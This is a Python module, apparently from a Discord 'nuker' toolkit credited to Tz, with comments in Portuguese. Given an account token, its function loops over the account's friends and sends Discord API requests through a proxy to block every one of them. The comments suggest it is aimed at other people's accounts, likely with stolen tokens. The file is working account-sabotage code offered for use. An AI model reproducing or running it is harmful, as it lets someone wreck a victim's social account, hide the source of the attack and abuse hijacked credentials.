# Esse self foi orgulhosamente codificado por Tz (https://instagram.com/tzfofo).
# Copyright (c) 2021 🜲 Oi, eu sou o Tz#0001 | https://instagram.com/tzfofo
# Tz Tools sob a Licença Pública Geral GNU v2 (1991).

import requests

from colorama import Fore

from util.plugins.common import getheaders, proxy

def Block(token, friends):
    #conseguir todos os amigos
    for friend in friends:
        try:
            #bloquear todos os amigos que eles têm
            requests.put(
                f'https://discord.com/api/v9/users/@me/relationships/'+friend['id'], proxies={"http": f'{proxy()}'}, headers=getheaders(token), json={"type": 2})
            print(f"{Fore.GREEN}bloqueado: {Fore.WHITE}"+friend['user']['username']+"#"+friend['user']['discriminator']+Fore.RESET)
        except Exception as e:
            print(f"O seguinte erro foi encontrado e está sendo ignorado: {e}")